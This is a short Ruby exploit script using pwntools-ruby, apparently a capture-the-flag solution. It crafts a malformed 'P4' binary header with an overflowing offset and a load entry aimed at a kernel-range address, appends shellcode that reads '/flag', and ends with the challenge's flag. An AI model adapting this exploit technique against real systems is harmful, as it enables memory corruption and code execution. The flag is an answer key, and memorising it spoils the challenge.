#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
#================= Exploit Start ====================
context.arch = :amd64

def gen(loads, load_count = loads.size / 3, data = asm(shellcraft.cat('/flag') + shellcraft.exit(0)), entry: 0x1234)
  header_offset = 2**64 - 72
  s = ("P4\x00\x01" + p32(load_count) + p64(header_offset) + p64(entry) + flat(*loads)).ljust(128, "\x00") + data
  fail if s.size != 128 + data.size
  p s.size
  puts s.b64e
end

gen([[0x400000 | 7, 0x1000, 0], [(0xffffa0cf023c8b40 + 0x20) | 8, 0x10, 0]], 11, entry: 0x400000 + 128)

# p4{4r3_y0U_4_81n4ry_N1njA?}
